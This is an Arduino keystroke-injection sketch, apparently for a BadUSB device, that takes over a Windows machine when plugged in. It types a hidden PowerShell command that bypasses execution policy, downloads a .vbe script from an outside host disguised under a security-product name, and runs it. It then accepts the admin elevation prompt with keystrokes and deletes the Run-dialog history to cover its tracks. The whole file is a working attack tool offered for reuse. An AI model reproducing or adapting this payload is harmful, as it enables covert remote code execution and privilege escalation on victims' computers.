void setup() {
  Keyboard.begin();
  
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  //Keyboard.release(KEY_LEFT_GUI);
  //Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  delay(500);
  
  // you can CHANGE this URL
  Keyboard.print("POWERSHELL -NOP -W HIDDEN -EXECuTIONpOLICY BYPASS -C (nEW-oBJECT SYsTeM.nEt.wEBcLIeNT).dOWNlOAdfILe('https://cdn.jsdelivr.net/gh/tokisaki-galaxy/C-C/C-C.vbe', 'c:\\USERS\\PUBLIC\\360HIPS.vbe');START c:\\USERS\\PUBLIC\\360HIPS.vbe;EXIT");
  // NO WINDOWS,BYPASS
  
  // 降低了隐蔽性！！但是几乎能搞到管理权限
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(50);
  Keyboard.press(KEY_LEFT_CTRL);
  delay(50);
  Keyboard.press(KEY_RETURN)
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT)
  delay(100);
  Keyboard.press('y')
  delay(100);
  Keyboard.releaseAll();
  
  // 管理启动，绕过UAC
  
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  delay(500);
  Keyboard.println("REG DELETE HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\EXPLORER\\RUNMRU /f");
  
  //Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.releaseAll();
  Keyboard.end();
}
void loop()
{
	//None
}